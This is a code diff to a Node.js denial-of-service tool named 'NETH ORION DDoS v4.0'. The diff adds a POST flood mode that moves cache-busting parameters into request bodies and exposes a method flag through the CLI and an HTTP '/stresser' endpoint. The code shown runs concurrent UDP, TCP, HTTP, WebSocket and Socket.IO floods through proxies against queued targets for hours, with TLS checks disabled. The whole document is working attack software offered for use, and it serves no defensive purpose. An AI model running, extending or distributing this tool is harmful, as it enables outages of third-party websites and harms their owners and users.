@@ -382,12 +382,20 @@ function socketIOFlood(url, threadId) {
   };
 }
 
-function socksRequest(url, agent, threadId) {
+function socksRequest(url, agent, threadId, method, body) {
   return new Promise((resolve) => {
     const start = Date.now();
     let socksHost = null;
     try { socksHost = new URL(url).hostname; } catch {}
-    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(null, socksHost), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
+    
+    const reqMethod = method || "GET";
+    const headers = getNoCacheHeaders(null, socksHost);
+    if (reqMethod === "POST") {
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      if (body) headers["Content-Length"] = Buffer.byteLength(body).toString();
+    }
+    
+    const req = https.request(url, { agent, method: reqMethod, headers, timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
       res.resume();
       
       if (socksHost && res.headers && res.headers['content-type']) {
@@ -410,6 +418,9 @@ function socksRequest(url, agent, threadId) {
       resolve(null);
     });
     req.on("timeout", () => { req.destroy(); resolve(null); });
+    if (reqMethod === "POST" && body) {
+      req.write(body);
+    }
     req.end();
   });
 }
@@ -441,7 +452,7 @@ function countThreadTypes() {
   return { direct, proxy };
 }
 
-const fireHTTPRequest = (url, ctx, threadId) => {
+const fireHTTPRequest = (url, ctx, threadId, method, body) => {
   return new Promise((resolve) => {
     const start = Date.now();
     const parsedUrl = new URL(url);
@@ -466,11 +477,18 @@ const fireHTTPRequest = (url, ctx, threadId) => {
     if (failCount > 10) {
       headers["Connection"] = "close";
     }
+    
+    const reqMethod = method || "GET";
+    if (reqMethod === "POST") {
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      if (body) headers["Content-Length"] = Buffer.byteLength(body).toString();
+    }
+    
     const options = {
       hostname: host,
       port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
       path: parsedUrl.pathname + parsedUrl.search,
-      method: "GET",
+      method: reqMethod,
       headers,
       agent,
       timeout: REQUEST_TIMEOUT,
@@ -509,6 +527,9 @@ const fireHTTPRequest = (url, ctx, threadId) => {
       req.destroy();
       resolve(null);
     });
+    if (reqMethod === "POST" && body) {
+      req.write(body);
+    }
     req.end();
   });
 };
@@ -777,20 +798,20 @@ function stopStatusDisplay() {
   if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
 }
 
-const addToQueue = async (url, durationHours) => {
+const addToQueue = async (url, durationHours, method) => {
   if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
   if (targetQueue.length >= MAX_QUEUE) { console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`)); return false; }
-  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
+  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000, method: method || "GET" };
   targetQueue.push(newTarget);
   state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
   saveNow();
-  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
+  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h [${newTarget.method}] (${targetQueue.length}/${MAX_QUEUE})`));
   return true;
-};
-
-const startAttack = async (url, durationHours) => {
+};const startAttack = async (url, durationHours, method) => {
   if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
-  if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours); }
+  if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours, method); }
+
+  const attackMethod = method || "GET";
 
   totalRequestsSent = 0;
   totalReqCount = 0;
@@ -798,7 +819,7 @@ const startAttack = async (url, durationHours) => {
   mediaTargets.clear();
   targetQueue = [];
 
-  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
+  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000, method: attackMethod };
   continueAttack = true;
   durationExpiryHandled = false;
   state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
@@ -809,6 +830,7 @@ const startAttack = async (url, durationHours) => {
 
   console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
   console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
+  console.log(colors.cyan(`Method: ${attackMethod}`));
   if (proxies.length) console.log(colors.magenta(`Proxies: ${proxies.length} available — randomly mixed with direct connections`));
   if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
   if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
@@ -817,8 +839,10 @@ const startAttack = async (url, durationHours) => {
   if (USE_WS) console.log(colors.red("WEBSOCKET FLOOD: ON"));
   if (USE_SOCKETIO) console.log(colors.red("SOCKET.IO FLOOD: ON"));
   console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP + WebSocket + Socket.IO)"));
+  if (attackMethod === "POST") console.log(colors.yellow("POST MODE: ON (requests sent as POST with cache busters in body)"));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
-  console.log("");    activeThreads = [];
+  console.log("");
+    activeThreads = [];
   threadTypes.clear();
   let threadId = 0;
   for (let i = 0; i < numThreads; i++) {
@@ -915,34 +939,64 @@ const performAttackSingle = async (target, ctx, threadId) => {
       socketIOFlood(target.url, threadId);
     }
     
+    const isPost = target.method === "POST";
     const startTime = Date.now();
     const promises = [];
     for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
       const cb = generateCacheBuster();
-      const sep = target.url.includes("?") ? "&" : "?";
-      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
-      if (ctx.type === "socks") {
-        promises.push(socksRequest(url, ctx.agent, threadId));
-      } else if (ctx.type === "http") {
-        let proxyHost = null;
-        try { proxyHost = new URL(url).hostname; } catch {}
-        const undiciHeaders = getNoCacheHeaders(null, proxyHost);
-        promises.push(
-          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: undiciHeaders, signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
-            .then(async (res) => { 
-              lastSuccessTime = Date.now(); 
-              if (proxyHost && res.headers && res.headers['content-type']) {
-                if (isMediaContentType(res.headers['content-type'])) {
-                  mediaTargets.add(proxyHost);
+      if (isPost) {
+        const body = `_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}&t=${Math.random().toString(36).slice(2, 8)}`;
+        if (ctx.type === "socks") {
+          promises.push(socksRequest(target.url, ctx.agent, threadId, "POST", body));
+        } else if (ctx.type === "http") {
+          let proxyHost = null;
+          try { proxyHost = new URL(target.url).hostname; } catch {}
+          const undiciHeaders = getNoCacheHeaders(null, proxyHost);
+          undiciHeaders["Content-Type"] = "application/x-www-form-urlencoded";
+          undiciHeaders["Content-Length"] = Buffer.byteLength(body).toString();
+          promises.push(
+            urequest(target.url, { dispatcher: ctx.dispatcher, method: "POST", headers: undiciHeaders, body, signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
+              .then(async (res) => { 
+                lastSuccessTime = Date.now(); 
+                if (proxyHost && res.headers && res.headers['content-type']) {
+                  if (isMediaContentType(res.headers['content-type'])) {
+                    mediaTargets.add(proxyHost);
+                  }
                 }
-              }
-              await res.body.dump(); 
-              return { status: res.statusCode }; 
-            })
-            .catch(() => null)
-        );
+                await res.body.dump(); 
+                return { status: res.statusCode }; 
+              })
+              .catch(() => null)
+          );
+        } else {
+          promises.push(fireHTTPRequest(target.url, ctx, threadId, "POST", body));
+        }
       } else {
-        promises.push(fireHTTPRequest(url, ctx, threadId));
+        const sep = target.url.includes("?") ? "&" : "?";
+        const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
+        if (ctx.type === "socks") {
+          promises.push(socksRequest(url, ctx.agent, threadId));
+        } else if (ctx.type === "http") {
+          let proxyHost = null;
+          try { proxyHost = new URL(url).hostname; } catch {}
+          const undiciHeaders = getNoCacheHeaders(null, proxyHost);
+          promises.push(
+            urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: undiciHeaders, signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
+              .then(async (res) => { 
+                lastSuccessTime = Date.now(); 
+                if (proxyHost && res.headers && res.headers['content-type']) {
+                  if (isMediaContentType(res.headers['content-type'])) {
+                    mediaTargets.add(proxyHost);
+                  }
+                }
+                await res.body.dump(); 
+                return { status: res.statusCode }; 
+              })
+              .catch(() => null)
+          );
+        } else {
+          promises.push(fireHTTPRequest(url, ctx, threadId));
+        }
       }
     }
 
@@ -1053,6 +1107,7 @@ const resumeAttack = async () => {
   
   console.log(colors.green(`\nAttack Resumed: ${currentTarget.url}`));
   console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
+  console.log(colors.cyan(`Method: ${currentTarget.method || "GET"}`));
   if (proxies.length) console.log(colors.magenta(`Proxies: ${proxies.length} available — randomly mixed with direct connections`));
   if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
   if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
@@ -1108,6 +1163,7 @@ const showStatus = () => {
   const { direct, proxy } = countThreadTypes();
   console.log(colors.cyan("\n=== ATTACK STATUS ==="));
   console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
+  console.log(`${colors.yellow("Method:")} ${currentTarget.method || "GET"}`);
   console.log(`${colors.gray(`Target duration: ${targetMin}min`)}`);
   console.log(`${colors.cyan(`Wall-clock elapsed: ${wallMin}min (${wallPct}%)`)}`);
   console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
@@ -1127,17 +1183,18 @@ const showStatus = () => {
 
 const showHelp = () => {
   console.log(colors.cyan("\n=== NETH ORION DDoS v4.0 ==="));
-  console.log(`${colors.green("start <url> [hours]")}        - Start multi-threaded attack`);
-  console.log(`${colors.green("add <url> [hours]")}          - Add to queue`);
-  console.log(`${colors.green("stop")}                       - Stop attack`);
-  console.log(`${colors.green("status")}                     - Show status`);
-  console.log(`${colors.green("queue")}                      - Show queue only`);
-  console.log(`${colors.green("clear")}                      - Clear console`);
-  console.log(`${colors.green("help")}                       - This help`);
-  console.log(`${colors.green("exit")}                       - Exit\n`);
+  console.log(`${colors.green("start <url> [hours] [-p|-g]")} - Start attack (default GET, -p for POST, -g for GET)`);
+  console.log(`${colors.green("add <url> [hours] [-p|-g]")}   - Add to queue with method flag`);
+  console.log(`${colors.green("stop")}                        - Stop attack`);
+  console.log(`${colors.green("status")}                      - Show status`);
+  console.log(`${colors.green("queue")}                       - Show queue only`);
+  console.log(`${colors.green("clear")}                       - Clear console`);
+  console.log(`${colors.green("help")}                        - This help`);
+  console.log(`${colors.green("exit")}                        - Exit\n`);
   console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE}`));
   console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | WS: ${USE_WS} | SocketIO: ${USE_SOCKETIO} | Keep-Alive: ${KEEP_ALIVE}`));
   console.log(colors.gray(`State persistence: atomic (temp file + rename)`));
+  console.log(colors.yellow("Flags: -p = POST (cache busters in body), -g = GET (cache busters in URL, default)"));
 };
 
 const showQueue = () => {
@@ -1146,7 +1203,7 @@ const showQueue = () => {
     console.log(colors.cyan("\n=== QUEUE ==="));
     targetQueue.forEach((t, idx) => {
       const r = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
-      console.log(`${idx + 1}. ${t.url} (${r}h left in queue)`);
+      console.log(`${idx + 1}. ${t.url} (${r}h left) [${t.method || "GET"}]`);
     });
   }
   console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
@@ -1159,18 +1216,29 @@ const clearConsole = () => {
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
+function parseMethodFlag(args) {
+  let method = null;
+  const filtered = args.filter(a => {
+    if (a === '-p') { method = 'POST'; return false; }
+    if (a === '-g') { method = 'GET'; return false; }
+    return true;
+  });
+  return { method, args: filtered };
+}
+
 const handleCommand = async (cmd) => {
   const parts = cmd.trim().split(/\s+/);
   const command = parts[0].toLowerCase();
-  const args = parts.slice(1);
+  const rawArgs = parts.slice(1);
+  const { method, args } = parseMethodFlag(rawArgs);
   switch (command) {
     case "start":
-      if (args.length < 1) { console.log(colors.red("Usage: start <url> [hours]")); return; }
-      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
+      if (args.length < 1) { console.log(colors.red("Usage: start <url> [hours] [-p|-g]")); return; }
+      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1, method);
       break;
     case "add":
-      if (args.length < 1) { console.log(colors.red("Usage: add <url> [hours]")); return; }
-      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
+      if (args.length < 1) { console.log(colors.red("Usage: add <url> [hours] [-p|-g]")); return; }
+      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1, method);
       break;
     case "queue": showQueue(); break;
     case "stop": await stopAttack(); break;
@@ -1192,17 +1260,19 @@ app.use(express.json());
 app.get("/stresser", async (req, res) => {
   const url = req.query.url;
   const duration = parseFloat(req.query.duration) || 1;
+  const method = req.query.method || null;
   if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
-  await startAttack(url, duration);
-  res.json({ success: true, message: `Attack started on ${url}` });
+  await startAttack(url, duration, method);
+  res.json({ success: true, message: `Attack started on ${url}`, method: method || "GET" });
 });
 
 app.get("/add", async (req, res) => {
   const url = req.query.url;
   const duration = parseFloat(req.query.duration) || 1;
+  const method = req.query.method || null;
   if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
-  const success = await addToQueue(url, duration);
-  res.json({ success, currentQueue: targetQueue.length });
+  const success = await addToQueue(url, duration, method);
+  res.json({ success, currentQueue: targetQueue.length, method: method || "GET" });
 });
 
 app.get("/stop", async (req, res) => {
